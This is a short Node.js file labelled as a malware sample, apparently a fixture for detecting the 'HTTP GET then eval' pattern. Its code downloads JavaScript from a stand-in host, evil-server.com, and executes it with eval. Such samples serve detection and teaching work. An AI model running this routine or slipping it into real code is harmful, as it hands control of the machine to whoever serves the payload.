// Malware Sample 2: Remote Code Execution via HTTP + eval
// Pattern: HTTP GET -> eval
const http = require('http');

const maliciousUrl = 'http://evil-server.com/payload.js';

http.get(maliciousUrl, (res) => {
    let payload = '';

    res.on('data', (chunk) => {
        payload += chunk;
    });

    res.on('end', () => {
        // Dangerous: Executes downloaded code
        eval(payload);
    });
}).on('error', (e) => {
    console.error(e);
});
